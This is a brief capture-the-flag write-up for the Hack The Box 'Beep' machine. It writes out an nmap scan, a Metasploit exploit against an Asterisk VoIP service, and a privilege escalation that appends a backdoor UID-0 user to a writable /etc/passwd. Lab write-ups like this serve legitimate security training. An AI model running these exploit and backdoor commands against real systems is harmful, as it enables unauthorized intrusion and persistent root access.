#Hack The Box: "Beep" Challenge Writeup
#Objective:

Gain access to a vulnerable Asterisk VoIP server and escalate privileges to root.

#Step 1: Scanning the Target

-Scanned the system with nmap to identify open ports:

    'bash
    'nmap -A -T4 <target_ip>

-Found multiple services, including SSH (port 22), HTTP (port 80), and Asterisk (port 5060).

#Step 2: Exploiting Asterisk VoIP

-Discovered the Asterisk server was running an outdated version that was vulnerable to remote code execution.
-Used an Asterisk-specific Metasploit module to gain a shell:

    'bash
    'msfconsole
    'use exploit/unix/asterisk/manager_exec
    'set RHOST <target_ip>
    'exploit

#Step 3: Privilege Escalation

-Enumerated the system for local vulnerabilities and found a writable /etc/passwd file.
-Added a new root user to the system by editing /etc/passwd:

    'bash
    'echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd

-Logged in as the new root user.

#Lessons Learned:

-VoIP servers can be a prime target for attackers due to misconfigurations.
-Always secure sensitive files like /etc/passwd to prevent unauthorized modification.
